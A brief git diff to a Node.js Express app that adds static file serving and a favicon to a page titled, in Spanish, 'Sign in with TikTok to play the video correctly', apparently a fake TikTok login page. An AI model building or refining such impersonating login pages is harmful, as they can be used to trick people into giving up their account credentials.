@@ -3,6 +3,7 @@ const express = require("express");
 const app = express();
 const PORT = process.env.PORT || 3000;
 
+app.use(express.static("public"));
 app.use(express.urlencoded({ extended: true }));
 
 // Usuarios de prueba
@@ -33,7 +34,7 @@ res.send(`
 
 <title>Inicia sesión con TikTok para reproducir correctamente el video</title>
 
-
+<link rel="icon" type="image/png" href="/icon.png">
 <style>
 
 *{
